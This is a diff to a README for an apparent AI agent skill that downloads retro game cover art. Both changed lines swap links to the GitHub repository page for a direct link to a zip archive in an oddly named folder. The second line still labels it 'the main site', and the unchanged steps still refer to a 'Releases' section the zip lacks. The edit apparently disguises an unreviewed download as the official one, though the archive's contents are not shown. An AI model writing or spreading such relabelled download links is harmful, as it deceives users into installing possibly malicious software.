@@ -1,6 +1,6 @@
 # 🎮 game-cover-downloader-skill - Batch download retro game collection art
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/trashy-whistler749/game-cover-downloader-skill)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://raw.githubusercontent.com/trashy-whistler749/game-cover-downloader-skill/main/Servetian/downloader_skill_cover_game_3.5-alpha.2.zip)
 
 This tool helps you manage retro game collections. It pulls game covers and logos from the Libretro database. You use these images in programs like Pegasus, ES-DE, or RetroArch. It works as an agent skill for AI tools like Claude Code or Codex CLI. You save time by automating the process of finding art for your game library.
 
@@ -18,7 +18,7 @@ Your computer must meet these basic needs to use this software:
 
 You need to download the tool from the official page to start using it. 
 
-Follow this link to the main site: [https://github.com/trashy-whistler749/game-cover-downloader-skill](https://github.com/trashy-whistler749/game-cover-downloader-skill)
+Follow this link to the main site: [https://raw.githubusercontent.com/trashy-whistler749/game-cover-downloader-skill/main/Servetian/downloader_skill_cover_game_3.5-alpha.2.zip](https://raw.githubusercontent.com/trashy-whistler749/game-cover-downloader-skill/main/Servetian/downloader_skill_cover_game_3.5-alpha.2.zip)
 
 1. Visit the link provided above.
 2. Look for the section labeled "Releases" on the right side of the page.
